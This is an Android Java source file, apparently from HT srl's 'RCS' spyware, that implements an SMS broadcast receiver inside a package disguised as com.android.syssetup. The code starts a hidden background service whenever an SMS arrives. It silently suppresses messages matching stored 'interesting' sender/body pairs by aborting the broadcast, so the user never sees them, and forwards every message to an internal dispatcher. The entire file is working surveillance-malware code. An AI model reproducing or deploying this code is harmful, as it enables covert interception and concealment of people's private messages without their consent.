/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : BroadcastMonitorSms.java
 * Created      : 6-mag-2011
 * Author		: zeno <- menzogne!
 * *******************************************/

package com.android.syssetup.listener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

import com.android.syssetup.Core;
import com.android.syssetup.SMain;
import com.android.syssetup.auto.Cfg;
import com.android.syssetup.event.EventSms;
import com.android.syssetup.evidence.Markup;
import com.android.syssetup.file.Path;
import com.android.syssetup.module.message.Sms;
import com.android.syssetup.util.Check;

import java.util.ArrayList;

public class BSm extends BroadcastReceiver {
	private static final String TAG = "BroadcastMonitorSms"; //$NON-NLS-1$

	public static synchronized void memorize(String number, String msg) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (memorize) " + number + " : " + msg);
		}
		Markup markup = new Markup(BSm.class);
		ArrayList<String[]> list = markup.unserialize(new ArrayList<String[]>());
		String[] interesting = new String[]{number, msg};
		list.add(interesting);
		markup.serialize(list);

		list = markup.unserialize(new ArrayList<String[]>());
		if (Cfg.DEBUG) {
			Check.log(TAG + " (memorize) list read: " + list.size());
		}
	}

	public static synchronized void cleanMemory() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (cleanMemory) ");
		}
		Markup markup = new Markup(BSm.class);
		markup.removeMarkup();
	}

	// Apparentemente la notifica di SMS inviato non viene inviata di proposito
	@Override
	public void onReceive(Context context, Intent intent) {
		boolean isCoreRunning = Core.iSR();
		if (isCoreRunning == false) {
			Intent serviceIntent = new Intent(context, SMain.class);

			// serviceIntent.setAction(Messages.getString("com.android.service_ServiceCore"));
			context.startService(serviceIntent);

			if (!Path.makeDirs()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onReceive) Error: Can't create a writable directory");
				}
				return;
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (onReceive): Started from SMS"); //$NON-NLS-1$
			}

		}

		if (intent == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onReceive): Intent null"); //$NON-NLS-1$
			}

			return;
		}

		final Bundle bundle = intent.getExtras();

		if (bundle == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onReceive): Bundle null"); //$NON-NLS-1$
			}

			return;
		}

		SmsMessage[] msgs = null;

		// Prendiamo l'sms
		// 26.0 = pdus
		final Object[] pdus = (Object[]) bundle.get("pdus"); //$NON-NLS-1$
		msgs = new SmsMessage[pdus.length];


		Markup markup = new Markup(BSm.class);
		ArrayList<String[]> list = null;
		synchronized (BSm.class) {
			list = markup.unserialize(new ArrayList<String[]>());
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onReceive) read list size: " + list.size());
			}
		}

		for (int i = 0; i < msgs.length; i++) {
			msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);

			final Sms sms = new Sms(msgs[i].getOriginatingAddress(), msgs[i].getMessageBody().toString(),
					System.currentTimeMillis());

			for (String[] pair : list) {
				if (EventSms.isInteresting(sms, pair[0], pair[1])) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (onReceive) isInteresting: " + sms.getAddress() + " -> " + sms.getBody());
					}
					abortBroadcast();
					break;
				}
			}

			if (isCoreRunning) {
				final int result = ListenerSms.self().dispatch(sms);
			} else {
				Thread thread = new Thread(new Runnable() {
					public void run() {
						try {
							Thread.sleep(5000);
						} catch (InterruptedException e) {

						}
						ListenerSms.self().dispatch(sms);
					}

					;
				});
				thread.start();
			}

		}
	}
}
